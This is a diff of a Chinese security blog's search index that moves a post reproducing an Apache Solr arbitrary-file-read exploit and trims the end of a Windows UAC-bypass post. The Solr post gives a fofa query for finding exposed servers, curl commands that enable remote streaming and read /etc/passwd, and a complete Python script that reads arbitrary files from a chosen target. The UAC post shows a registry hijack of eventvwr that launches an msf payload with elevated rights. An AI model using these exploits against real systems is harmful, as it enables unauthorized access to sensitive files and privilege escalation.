-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="comment">#1.exe为msf马</span></span><br></pre></td></tr></table></figure>
-
-<p>如果直接执行shell.exe，反弹回来的会话不能通过getsystem直接提权，因为会被UAC拦截</p>
-<p><img src="/images/image-20210119171432120.png" alt="image-20210119171432120"></p>
-<p>劫持注册表后，再次执行eventvwr，程序就会去查找劫持的注册表地址，然后以自动提权之后的管理员权限加载shell.exe，此时反弹回来的会话可通过getsystem直接提权</p>
-<p><img src="/images/image-20210119170019046.png" alt="image-20210119170019046"></p>
-<p>最后记得清除注册表项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是，执行eventvwr命令时才会去注册表查找mmc.exe的路径，如果执行的是mmc.exe eventvwr.msc，直接加载mmc.exe，是不会去查询注册表的。</p>
 ]]></content>
       <categories>
-        <category>域渗透</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -2204,6 +2204,42 @@
       </tags>
   </entry>
   <entry>
+    <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
+    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<blockquote>
+<p>  这周在hw，水一篇文章，记录一下漏洞利用，当一个合格的脚本小子</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>由于Apache Solr默认安装时未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p>
+<blockquote>
+<p>  听说报给官方后，官方拒绝修复，认为这不是一个漏洞，比一些src还离谱，人家起码会给个内部已知:eyes:</p>
+</blockquote>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><center>Apache Solr <= 8.8.1（全版本）</center> 
+
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>fofa 语法：<code>app=&quot;Solr&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204223.png" alt="image-20210318195353083"></p>
+<h4 id="3-1-获取-core-name，拼接url"><a href="#3-1-获取-core-name，拼接url" class="headerlink" title="3.1 获取 core name，拼接url"></a>3.1 获取 core name，拼接url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204233.png" alt="image-20210318195317802"></p>
+<p>Core name为：<code>arabnews</code>，那么使用的url 为 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="string">&#x27;Content-type:application/json&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续使用 core name 拼接 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="string">&quot;stream.url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-攻击"><a href="#3-2-攻击" class="headerlink" title="3.2 攻击"></a>3.2 攻击</h4><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204248.png" alt="image-20210318200603145"></p>
+<h2 id="0x04-漏洞POC"><a href="#0x04-漏洞POC" class="headerlink" title="0x04  漏洞POC"></a>0x04  漏洞POC</h2><p>PeiQi文库的大佬已经写好了，我改了一点小毛病，读取完返回的值不一定是json，我复现的时候就遇到了这个问题，将json处理删掉了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : PeiQi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_url = target_url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="number">10</span>)</span><br><span class="line">        core_name = <span class="built_in">list</span>(json.loads(response.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> core_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, core_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;responseHeader&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_3</span>(<span class="params">target_url, core_name, File_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="built_in">format</span>(core_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(File_name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No such file or directory&quot;</span> <span class="keyword">in</span> response.text:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.<span class="built_in">format</span>(File_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    core_name = POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        File_name = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
     <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
     <content><![CDATA[<blockquote>
@@ -2252,42 +2288,6 @@
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
 <p>运行即可。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
-    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<blockquote>
-<p>  这周在hw，水一篇文章，记录一下漏洞利用，当一个合格的脚本小子</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>由于Apache Solr默认安装时未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p>
-<blockquote>
-<p>  听说报给官方后，官方拒绝修复，认为这不是一个漏洞，比一些src还离谱，人家起码会给个内部已知:eyes:</p>
-</blockquote>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><center>Apache Solr <= 8.8.1（全版本）</center> 
-
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>fofa 语法：<code>app=&quot;Solr&quot;</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204223.png" alt="image-20210318195353083"></p>
-<h4 id="3-1-获取-core-name，拼接url"><a href="#3-1-获取-core-name，拼接url" class="headerlink" title="3.1 获取 core name，拼接url"></a>3.1 获取 core name，拼接url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204233.png" alt="image-20210318195317802"></p>
-<p>Core name为：<code>arabnews</code>，那么使用的url 为 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="string">&#x27;Content-type:application/json&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>继续使用 core name 拼接 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="string">&quot;stream.url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-2-攻击"><a href="#3-2-攻击" class="headerlink" title="3.2 攻击"></a>3.2 攻击</h4><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204248.png" alt="image-20210318200603145"></p>
-<h2 id="0x04-漏洞POC"><a href="#0x04-漏洞POC" class="headerlink" title="0x04  漏洞POC"></a>0x04  漏洞POC</h2><p>PeiQi文库的大佬已经写好了，我改了一点小毛病，读取完返回的值不一定是json，我复现的时候就遇到了这个问题，将json处理删掉了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : PeiQi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_url = target_url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="number">10</span>)</span><br><span class="line">        core_name = <span class="built_in">list</span>(json.loads(response.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> core_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, core_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;responseHeader&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_3</span>(<span class="params">target_url, core_name, File_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="built_in">format</span>(core_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(File_name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No such file or directory&quot;</span> <span class="keyword">in</span> response.text:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.<span class="built_in">format</span>(File_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    core_name = POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        File_name = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
